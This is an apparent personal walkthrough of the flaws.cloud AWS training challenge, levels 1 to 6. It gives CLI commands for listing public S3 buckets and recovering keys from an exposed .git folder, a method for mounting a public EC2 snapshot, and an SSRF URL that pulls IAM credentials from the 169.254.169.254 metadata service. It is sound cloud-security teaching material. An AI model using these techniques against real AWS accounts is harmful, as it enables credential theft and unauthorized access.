# http://flaws.cloud/

# Level 1: This level is *buckets* of fun. See if you can find the first sub-domain.
Find first subdomain:
- The `hint 1` said that this site http://flaws.cloud/ is hosted as an S3 bucket. So I think we should find the bucket name of this S3. The facts also said that: When hosting a site as an S3 bucket, the bucket name (flaws.cloud) must match the domain name (flaws.cloud).
- Let's try this site flaws.cloud as a bucket name.
- Using the AWS CLI tool: `aws s3 ls s3://flaws.cloud`, when using this CLI tool, You do not need to know the region where the s3 bucket is hosted, so with above command, if the bucket is exist, you can see the bucket file. 
- The other way: http://flaws.cloud.s3.amazonaws.com/
- Get `secret file`: `http://flaws.cloud.s3.amazonaws.com/secret-dd02c7c.html`. Chall done.
- Lesson learn: One tip to check wheather a site is hosted as an S3 bucket: Using nslookup command, if you see the IP point to s3 nameserver -> s3 bucket
# Level 2: Same Level1:
- Using command: `aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud`
- Checking the secret file: http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud.s3.amazonaws.com/secret-e4443fc.html
# Level 3: 
- Using command: `aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud`
- Found /.git -> using gitdumper: `./gitdumper.py http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git 
- or sync this bucket to local: `aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2`
- git checkout > get secret key, access key ID. 
- Using command `aws --profile flaws configure` to configure new profile with these key
# Level 4: 
For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud

- The website is runing on EC2 instance, the facts also said that a snapshot was made of that EC2.
- Let's check the snapshot using aws cli with above profile:
- Get account-ids: `aws --profile flaws sts get-caller-identity`.
- Get snapshot by accound-id: `aws ec2 describe-snapshots --profile flaws --owner-id 975426262029` 
- Create volumn from snapshot: `aws ec2 create-volume --availability-zone us-west-2b --region us-west-2  --snapshot-id snap-0b49342abd1bdcb89`
- Attach volumn to instance:
   - Create ec2: I'm using aws console
   - Attach volumn to ec2 you just created.
- Connect to the EC2 instance
- Mount disk: mount /dev/<> /mnt
- Cat password: cat /mnt/home/ubuntu/setupNginx.sh
- Lesson learned: 
AWS allows you to make snapshots of EC2's and databases (RDS). The main purpose for that is to make backups, but people sometimes use snapshots to get access back to their own EC2's when they forget the passwords. This also allows attackers to get access to things. Snapshots are normally restricted to your own account, so a possible attack would be an attacker getting access to an AWS key that allows them to start/stop and do other things with EC2's and then uses that to snapshot an EC2 and spin up an EC2 with that volume in your environment to get access to it. Like all backups, you need to be cautious about protecting them.
# Lesson 5: SSRF AWS steal aws key
- This EC2 has a simple HTTP only proxy on it. via access a website through http://chall-url/proxy/website.
- This website do not validate the url from user, so we can perform an SSRF to specified IP:`169.254.169.254` to get key information about IAM user.
- http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials
- http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
- Add key to aws configure file: `/.aws/credential`
- List level 6 bucket: `aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --profile flaws`

- Lession learned:
The IP address 169.254.169.254 is a magic IP in the cloud world. AWS, Azure, Google, DigitalOcean and others use this to allow cloud resources to find out metadata about themselves. Some, such as Google, have additional constraints on the requests, such as requiring it to use `Metadata-Flavor: Google` as an HTTP header and refusing requests with an `X-Forwarded-For` header. AWS has recently created a new IMDSv2 that requires special headers, a challenge and response, and other protections, but many AWS accounts may not have enforced it. If you can make any sort of HTTP request from an EC2 to that IP, you'll likely get back information the owner would prefer you not see.
Examples of this problem
Nicolas GrÃ©goire discovered that prezi allowed you point their servers at a URL to include as content in a slide, and this allowed you to point to 169.254.169.254 which provided the access key for the EC2 intance profile (link). He also found issues with access to that magic IP with Phabricator and Coinbase.
A similar problem to getting access to the IAM profile's access keys is access to the EC2's user-data, which people sometimes use to pass secrets to the EC2 such as API keys or credentials.
Avoiding this mistake
Ensure your applications do not allow access to 169.254.169.254 or any local and private IP ranges. Additionally, ensure that IAM roles are restricted as much as possible.

# Level 6:
- Get Username: `aws --profile level6 iam get-user` : Level6
- Get attached inline polices to this user: `aws iam list-attached-user-policies --user-name Level6 --profile level6`: list_apigateways, MySecurityAudit
- Get version to get detail about policy:
- `aws iam list-policy-versions --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --profile level6`

- `aws iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4 --profile level6`
- See hidden resource: `"Resource": "arn:aws:apigateway:us-west-2::/restapis/*"`

- `aws iam get-policy-version --policy-arn arn:aws:iam::aws:policy/SecurityAudit --version-id v35 --profile level6`

- List lambda function: `aws lambda list-functions --profile level6`
- get policy details:  `aws --profile level6 lambda get-policy --function-name Level6`. Because the MySecurityAudit policy allow this :D
